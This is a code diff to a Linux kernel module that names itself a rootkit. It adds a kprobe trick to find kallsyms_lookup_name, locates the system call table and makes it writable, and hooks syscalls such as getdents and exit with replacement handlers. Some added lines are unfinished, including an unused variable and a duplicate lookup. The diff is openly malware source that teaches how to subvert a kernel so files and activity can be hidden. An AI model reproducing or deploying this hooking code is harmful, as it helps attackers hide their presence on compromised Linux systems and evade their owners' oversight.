@@ -6,6 +6,7 @@
 #include <linux/kprobes.h>
 #include <asm/pgtable_types.h>
 #include <linux/kallsyms.h>
+#include <linux/syscalls.h>
 
 MODULE_AUTHOR("Parth Thakkar");
 MODULE_DESCRIPTION("Rootkit");
@@ -32,21 +33,24 @@ MODULE_LICENSE("GPL");
 
 
 
-struct linux_dirent{
-	long d_ino;
-	off_t d_off;
-	unsigned short d_reclen;
-	char d_name[];
+struct linux_dirent {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen;
+	char		d_name[];
 };
 
 struct linux_dirent64 {
-    ino_t        d_ino;    /* 64-bit inode number */
-    off_t        d_off;    /* 64-bit offset to next structure */
-    unsigned short d_reclen; /* Size of this dirent */
-    unsigned char  d_type;   /* File type */
-    char           d_name[]; /* Filename (null-terminated) */
+	u64		d_ino;
+	s64		d_off;
+	unsigned short	d_reclen;
+	unsigned char	d_type;
+	char		d_name[];
 };
 
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
 
 asmlinkage long (*original_getdents64)(int fd, struct linux_dirent64 * dirp, unsigned int count);
 asmlinkage long (*original_getdents)(int fd, struct linux_dirent * dirp, unsigned int count);
@@ -174,6 +178,8 @@ asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * dirp, unsigned i
 asmlinkage long fake_getdents(int fd, struct linux_dirent * dirp, unsigned int count) {
     printk("Fake getdents called \n");
     
+
+    long nbytes = (typeof(sys_getdents)*)(original_getdents)(fd, dirp, count);
     return original_getdents(fd, dirp, count);
 }
 
@@ -184,6 +190,18 @@ static int __init custom_init(void)
     int ret = 0;
     printk(KERN_INFO "Init\n");
 
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t kallsyms_lookup_name_my;
+    register_kprobe(&kp);
+    kallsyms_lookup_name_my = (kallsyms_lookup_name_t) kp.addr;
+    unregister_kprobe(&kp);
+    sys_call_table_addr = (void *)kallsyms_lookup_name_my("sys_call_table");
+    if (sys_call_table_addr == NULL)
+    {
+        pr_info("sys_call_table not found using kprobe my kallsyms\n");
+        return -1;
+    }
+    printk(KERN_INFO "sys_call_table pointer from kprobe is %p\n", sys_call_table_addr);
 
     //get and store sys_call_table ptr
     sys_call_table_addr = (void *)kallsyms_lookup_name("sys_call_table");
@@ -193,7 +211,7 @@ static int __init custom_init(void)
         return -1;
     }
 
-    printk(KERN_INFO "sys_call_table pointer is %p\n", sys_call_table_addr);
+    printk(KERN_INFO "sys_call_table pointer from normal lookup is %p\n", sys_call_table_addr);
 
     make_rw((unsigned long)sys_call_table_addr);
     original_sys_exit = sys_call_table_addr[__NR_exit];
